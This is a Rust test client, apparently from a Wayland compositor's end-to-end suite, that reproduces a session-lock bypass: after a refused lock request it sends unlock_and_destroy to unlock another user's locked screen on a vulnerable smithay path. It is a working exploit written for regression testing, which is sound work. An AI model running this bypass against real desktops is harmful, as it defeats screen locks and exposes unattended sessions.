//! The lock-screen bypass, spelled as a client — the attacker half of
//! the session-lock e2e, pointed at a `chonk-lock-probe --hold` that is
//! holding a confirmed lock on the same session.
//!
//! This is not a synthetic sequence. It is every request a process
//! needs to make, from no privilege beyond having opened the Wayland
//! socket, to put the user's desktop back on an unattended screen:
//!
//! ```text
//!  -> wl_registry#2.bind(ext_session_lock_manager_v1)
//!  -> ext_session_lock_manager_v1#3.lock(new id 4)
//!  <- ext_session_lock_v1#4.finished()     <- the compositor's refusal
//!  -> ext_session_lock_v1#4.unlock_and_destroy()
//! ```
//!
//! The third line is the compositor doing the right thing: a live
//! locker already holds the session, so `lock::LockRequest::Deny` drops
//! the confirmation, which sends `finished`. What it cannot do is
//! destroy that object — only the client may — so the refusal hands the
//! caller a live `ext_session_lock_v1` whose per-object `lock_status`
//! is false, and smithay 0.7.0's `unlock_and_destroy` arm posts
//! `invalid_unlock` on it *without returning* and then calls
//! `state.unlock()` regardless. The error kills this process's
//! connection, which an attacker does not care about, because by then
//! the screen is already the user's desktop.
//!
//! What the fixed compositor does instead is refuse at the door:
//! `lock::request_unlock` sees an object that is not the recorded
//! holder, logs the attempt, and posts `invalid_unlock` *in place of*
//! unlocking. From out here the two are told apart by exactly one
//! thing — whether the session is still locked afterwards — which is
//! why the checkpoints below are only half the test and
//! `tests/session_lock.rs` takes the screenshot.
//!
//! The script, each step reported on stdout in the shape the e2e polls
//! for:
//!
//! 1. Bind the manager. **`bound the lock manager`**
//! 2. `lock`, and expect `finished` rather than `locked` — a session
//!    already locked by someone else must refuse a second locker, and
//!    if it does not, the bypass is not even needed.
//!    **`lock refused`**
//! 3. `unlock_and_destroy` on the refused object, then roundtrip.
//!    **`unlock_and_destroy sent`**, then either
//!    **`refused: <protocol error>`** (the connection died, no unlock)
//!    or **`accepted without error`** (the compositor answered a
//!    non-holder's unlock silently).
//!
//! Neither outcome is failure on its own: a compositor is entitled to
//! answer an impostor with an error or with silence, and the assertion
//! that matters is made by the harness against the session, not here.
//! Exiting 0 either way is deliberate — this probe reports, the test
//! judges.

use std::io::Write;

use wayland_client::{Connection, Dispatch, Proxy, QueueHandle};
use wayland_client::protocol::wl_registry;
use wayland_protocols::ext::session_lock::v1::client::{
    ext_session_lock_manager_v1::ExtSessionLockManagerV1,
    ext_session_lock_v1::{self, ExtSessionLockV1},
};

fn fatal(message: &str) -> ! {
    eprintln!("chonk-lock-thief: {message}");
    let _ = std::io::stdout().flush();
    std::process::exit(1);
}

#[derive(Default)]
struct Thief {
    lock_manager: Option<ExtSessionLockManagerV1>,
    /// `locked` arrived — the compositor handed the session to a client
    /// that did not have it. A failure all by itself.
    locked: bool,
    /// `finished` arrived — the refusal this probe expects, and the
    /// event that leaves the live object the bypass is sent on.
    finished: bool,
}

impl Dispatch<wl_registry::WlRegistry, ()> for Thief {
    fn event(
        thief: &mut Self,
        registry: &wl_registry::WlRegistry,
        event: wl_registry::Event,
        _: &(),
        _: &Connection,
        qh: &QueueHandle<Self>,
    ) {
        if let wl_registry::Event::Global { name, interface, .. } = event {
            if interface == "ext_session_lock_manager_v1" {
                thief.lock_manager = Some(registry.bind(name, 1, qh, ()));
            }
        }
    }
}

impl Dispatch<ExtSessionLockV1, ()> for Thief {
    fn event(
        thief: &mut Self,
        _: &ExtSessionLockV1,
        event: ext_session_lock_v1::Event,
        _: &(),
        _: &Connection,
        _: &QueueHandle<Self>,
    ) {
        match event {
            ext_session_lock_v1::Event::Locked => thief.locked = true,
            ext_session_lock_v1::Event::Finished => thief.finished = true,
            _ => {}
        }
    }
}

impl Dispatch<ExtSessionLockManagerV1, ()> for Thief {
    fn event(
        _: &mut Self,
        _: &ExtSessionLockManagerV1,
        _: <ExtSessionLockManagerV1 as Proxy>::Event,
        _: &(),
        _: &Connection,
        _: &QueueHandle<Self>,
    ) {
    }
}

/// The protocol error the compositor posted, if it killed us — the
/// interesting half of a broken connection here, since being killed is
/// the *expected* answer to this request.
fn protocol_error(conn: &Connection) -> Option<String> {
    let error = conn.protocol_error()?;
    Some(format!(
        "{}@{} code {}: {}",
        error.object_interface, error.object_id, error.code, error.message
    ))
}

fn main() {
    let conn = Connection::connect_to_env().unwrap_or_else(|e| fatal(&format!("no compositor: {e}")));
    let mut queue = conn.new_event_queue();
    let qh = queue.handle();
    let mut thief = Thief::default();
    conn.display().get_registry(&qh, ());
    queue.roundtrip(&mut thief).unwrap_or_else(|e| fatal(&format!("registry roundtrip failed: {e}")));

    // -- 1: the manager, advertised to every client on the socket ------
    // The filter on this global is deliberately `|_| true`
    // (`state.rs`'s session-lock comment): locking is harmless, and a
    // filter would need a sandboxing story this desktop does not have.
    // That is the premise of this whole probe — it is not privileged,
    // and nothing about it had to be.
    let Some(manager) = thief.lock_manager.clone() else {
        fatal("the compositor does not advertise ext_session_lock_manager_v1");
    };
    println!("bound the lock manager");

    // -- 2: ask for the lock, and be refused ---------------------------
    let lock = manager.lock(&qh, ());
    if let Err(error) = queue.roundtrip(&mut thief) {
        fatal(&format!("the connection broke while asking for the lock: {error}"));
    }
    if thief.locked {
        // The compositor handed a second client the lock outright,
        // which is a worse bug than the one under test and needs no
        // bypass at all.
        println!("lock granted to a second client");
        let _ = std::io::stdout().flush();
        std::process::exit(0);
    }
    if !thief.finished {
        fatal("the lock request was neither granted nor refused");
    }
    println!("lock refused");

    // -- 3: the bypass ------------------------------------------------
    // `finished` did not destroy the object — it cannot; only the
    // client may — so this request is legal to *send*, and on smithay
    // 0.7.0's unguarded path it reaches `SessionLockHandler::unlock`
    // and the desktop comes back.
    lock.unlock_and_destroy();
    println!("unlock_and_destroy sent");
    let _ = std::io::stdout().flush();
    match queue.roundtrip(&mut thief) {
        Err(error) => {
            let reported = protocol_error(&conn).unwrap_or_else(|| error.to_string());
            println!("refused: {reported}");
        }
        Ok(_) => println!("accepted without error"),
    }
    let _ = std::io::stdout().flush();
}
